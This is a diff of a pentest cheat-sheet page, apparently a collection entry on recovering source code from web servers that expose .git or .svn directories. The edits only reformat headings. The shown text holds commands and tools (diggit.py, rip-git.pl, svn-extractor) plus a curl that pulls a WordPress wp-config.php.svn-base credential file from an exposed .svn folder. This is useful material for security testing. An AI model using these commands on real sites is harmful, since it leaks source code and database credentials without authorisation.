@@ -1,7 +1,7 @@
 # GIT - Source management
 
-Github example
-1. Check 403 error (Forbidden) for .git or even better : directory listing 
+## Github example with a .git
+1. Check 403 error (Forbidden) for .git or even better : directory listing
 
 2. Git saves all informations in log file .git/logs/HEAD (try 'head' too)
 ```
@@ -55,7 +55,7 @@ git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
 
 
 
-5. Alternative way : diggit.py
+## Automatic way : diggit.py
 ```
 ./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
 ./diggit.py -u http://webpage.com -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
@@ -65,7 +65,7 @@ git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
 -o is a hash of particular Git object to download
 ```
 
-5. Alternative way : rip-git
+## Alternative way : rip-git
 ```
 perl rip-git.pl -v -u "http://edge1.web.*****.com/.git/"   
 
@@ -82,7 +82,7 @@ git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 
 
 # SVN - Source management
-SVN example (Wordpress)
+## SVN example (Wordpress)
 ```
 curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
 ```
@@ -100,7 +100,7 @@ use first two signs from hash as folder name inside pristine/ directory (94 in t
 create complete path, which will be: http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base
 
 
-### Automatic way -
+## Automatic way -
 ```
 git clone https://github.com/anantshri/svn-extractor.git
 python svn-extractor.py –url “url with .svn available”
